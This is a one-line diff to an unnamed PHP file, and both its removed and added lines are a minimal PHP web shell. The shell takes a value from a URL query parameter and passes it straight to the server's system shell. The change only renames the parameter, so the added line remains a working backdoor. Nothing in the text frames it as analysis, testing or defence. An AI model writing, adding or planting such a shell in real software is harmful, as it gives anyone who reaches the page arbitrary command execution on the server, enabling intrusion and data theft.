@@ -1,1 +1,1 @@
-<?php system($_GET['meow']); ?>
+<?php system($_GET['yeet']); ?>
